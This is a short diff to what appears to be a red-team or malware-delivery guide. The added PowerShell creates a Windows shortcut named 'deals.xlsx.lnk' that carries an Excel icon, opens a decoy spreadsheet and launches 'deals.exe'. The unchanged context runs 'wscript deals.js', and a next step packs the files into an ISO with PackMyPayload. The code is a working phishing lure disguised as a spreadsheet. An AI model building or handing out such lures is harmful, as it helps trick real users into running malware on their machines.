@@ -51,6 +51,14 @@ $lnk.TargetPath = "%COMSPEC%"
 $lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
 $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
 $lnk.Save()
+
+
+$wsh = New-Object -ComObject WScript.Shell
+$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
+$lnk.TargetPath = "%COMSPEC%"
+$lnk.Arguments = "/C start deals.xlsx && deals.exe"
+$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
+$lnk.Save()
 ```
 
 3. In a wsl shell use PackMyPayload to  pack the files into an `iso`.
